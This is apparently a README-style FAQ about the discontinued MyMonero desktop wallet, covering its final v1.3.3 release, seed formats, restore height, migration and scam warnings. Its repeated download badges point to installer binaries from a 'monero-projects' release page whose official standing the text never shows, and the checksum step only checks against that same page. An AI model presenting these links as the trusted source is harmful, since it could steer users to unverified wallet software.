<p align="center"><img src="https://github.com/monero-projects/learn/raw/HEAD/assets/banner-article.png" alt="MyMonero article banner" width="100%"></p>

<h1 align="center">MyMonero FAQ: Desktop Status, Recovery, and Safety</h1>
<p align="center">Clear answers to common questions about the final desktop release, wallet access, seeds, and migration.</p>

<p align="center">
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe"><img src="https://img.shields.io/badge/Download_for_Windows-00C6FF?style=for-the-badge&logo=windows&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Windows"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg"><img src="https://img.shields.io/badge/Download_for_macOS-00C6FF?style=for-the-badge&logo=apple&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for macOS"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip"><img src="https://img.shields.io/badge/Download_for_Linux-00C6FF?style=for-the-badge&logo=linux&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Linux"></a>
</p>

| Platform | File | Version |
|---|---|---|
| Windows | [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe) | v1.3.3 |
| macOS | [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg) | v1.3.3 |
| Linux | [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip) | v1.3.3 |

All versions and checksums are on the [MyMonero v1.3.3 release page](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3).

## Short answer
MyMonero desktop’s final release is v1.3.3: the old app still opens wallets and sends XMR, but is no longer maintained. Hosted servers and web-wallet login stopped; you can continue with desktop or restore your seed in Cake Wallet, while keeping recovery words private.

## You'll see this if
- You want to know whether MyMonero desktop is still available or maintained.
- Hosted web-wallet login does not work.
- You need to restore a 13-word or 25-word seed.
- You are deciding whether to migrate, sweep, or keep the desktop app.
- A stranger offers urgent help and asks for your recovery phrase.

## Why it happens
Questions often combine several distinct topics: the status of the hosted service, whether the desktop app can still be opened, and how to restore a wallet. The confirmed facts are that the hosted servers and web-wallet login stopped; the desktop final release is v1.3.3 on the monero-projects GitHub project; and the old app still opens wallets and sends XMR but receives no new features or security updates. A shutdown date is unconfirmed here. Separate these facts from rumors about dates, data folders, or what servers may have seen.

The final desktop packages are Windows .exe, macOS .dmg, and Linux .zip. The published [MyMonero v1.3.3 release](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3) is the source for installers and the SHA-256 value used for integrity checks. A checksum comparison confirms a file matches that published value, not that the product is maintained.

Your two stated options are to keep using MyMonero desktop with its limitations or restore your seed in Cake Wallet. Cake Wallet runs on iOS, Android, macOS, and Linux; Windows desktop builds are paused at the time of writing. Read [MyMonero shutdown facts](./mymonero-shutdown-facts.md) and [MyMonero migration checklist](./mymonero-migration-checklist.md) for more context.

---

## Fix
1. **If the hosted login fails, distinguish it from desktop.** MyMonero hosted servers and web-wallet login stopped. Repeatedly trying to log in or looking for a password reset will not restore hosted access; the password-reset method is not confirmed here.
2. **If the desktop app will not open, check launch symptoms.** The final version is v1.3.3. Use the official project release source, preserve your wallet information, and see [MyMonero app not opening](./mymonero-app-not-opening.md) or [app crashes on start](./mymonero-app-crashes-on-start.md). For the specified Mac block, right-click the app and choose Open only after checking the source.
3. **If you need an installer, verify it.** Compare the file’s SHA-256 to the value on the GitHub release page. Windows command: `certutil -hashfile <file> SHA256`; macOS: `shasum -a 256 <file>`; Linux: `sha256sum <file>`. Do not use a file whose value does not match.
4. **Identify your seed format before restoring.** MyMonero’s 13 words are MyMonero-specific and legacy; 25 words are standard Monero. Do not guess or convert word formats. See [MyMonero seed 13 vs 25 words](./mymonero-seed-13-vs-25-words.md), then follow the matching restore guide.
5. **Understand restore height.** Restore height is the block height where scanning begins. Earlier is safer for finding older activity if you are unsure, but takes longer. It is not a secret or a replacement for your seed. See [MyMonero restore height explained](./mymonero-restore-height-explained.md).
6. **Choose restore versus sweep deliberately.** Restoring uses your seed in a wallet; sweeping sends all funds to a new wallet. A connection error or stopped hosted login does not automatically mean a sweep is needed. See [sweeping funds to a new wallet](./mymonero-sweep-funds-new-wallet.md).
7. **Protect every recovery detail.** Never share the seed, private keys, or wallet backup. Nobody legitimate asks for your seed. Do not paste it into a form or reply to an unsolicited migration message.

> [!TIP]
> Take one issue at a time: hosted login, desktop launch, seed format, or a transaction display. That makes it easier to find relevant instructions without exposing wallet secrets.

---

## If that did not work
If your seed is missing or a word is unclear, do not guess and do not send the partial phrase to anyone. Offline recovery of a missing seed word is not confirmed in this guidance. Keep any existing notes private and consult the find MyMonero seed guide for safe ways to search your own backups. No password-reset method is confirmed here.

If a restore asks for an import fee, only a historical fact is available: MyMonero hosted servers charged a one-time fee to import a wallet created elsewhere. No current fee is stated. Do not pay a person or an address because of a message; see MyMonero import fee explained.

If an error appears, record the exact non-sensitive wording, which app you were using, and the action that triggered it. Error 523 relates to the server connection being unavailable as general guidance; it does not mean funds are lost. See MyMonero Error 523 and the error-code troubleshooting guide.

> [!WARNING]
> Do not trust anyone who asks for your seed, private keys, a payment to unlock a wallet, or remote access to migrate funds. Nobody legitimate asks for your seed. Pause before using links sent by strangers.

---

## Prevention
Store a legible seed backup securely and away from the device. Know whether it is 13 MyMonero-specific legacy words or 25 standard Monero words, but do not share the words themselves. Keep backups private and do not use screenshots or public notes. See MyMonero seed backup safety.

Download the final desktop package from the monero-projects GitHub release and compare its SHA-256 with the value published there. Avoid fake downloads and unsolicited update links. Remember that v1.3.3 is no longer maintained, even though the old app still opens wallets and sends XMR. Review is MyMonero safe? before deciding to continue.

Do not rush a migration because of a shutdown rumor. A date is unconfirmed here. Consider the two options, the target platform, your backup, and restore height. Cake Wallet runs on iOS, Android, macOS, and Linux; Windows desktop builds are paused at the time of writing. Keep wallet recovery distinct from sweeping funds.

## FAQ
<details><summary>Can I still use MyMonero desktop?</summary>

The old app still opens wallets and sends XMR. Its final release is v1.3.3, and it is no longer maintained or updated.

</details>

<details><summary>Why can’t I log in to the hosted wallet?</summary>

MyMonero hosted servers and web-wallet login stopped. Hosted access is separate from the desktop application.

</details>

<details><summary>Which seed format might I have?</summary>

MyMonero may use 13 MyMonero-specific legacy words or 25 standard Monero words. Identify the format before following a restore guide.

</details>

<details><summary>Should I share my seed with support?</summary>

No. Nobody legitimate asks for your seed. Keep it private, including during migration and troubleshooting.

</details>

---

## Download MyMonero

- Windows: [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe)
- macOS: [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg)
- Linux: [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip)

Check each file against the checksums on the [MyMonero v1.3.3 release](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3) before you install it.

## Related articles

| Article | Topic |
|---|---|
| [MyMonero Shutdown Facts: What Is and Is Not Known](./mymonero-shutdown-facts.md) | Separate confirmed product status from uncertain dates and details, and plan next steps without panic. |
| [Is MyMonero Safe? Practical Considerations](./is-mymonero-safe.md) | Understand the desktop app’s maintenance status, protect your seed, and assess choices without absolute promises. |
| [MyMonero Migration Scams: Warning Signs and Safer Choices](./mymonero-migration-scams.md) | Spot pressure tactics, protect recovery words, and plan any wallet transition at your own pace. |

[Back to all MyMonero guides](https://github.com/monero-projects/learn)
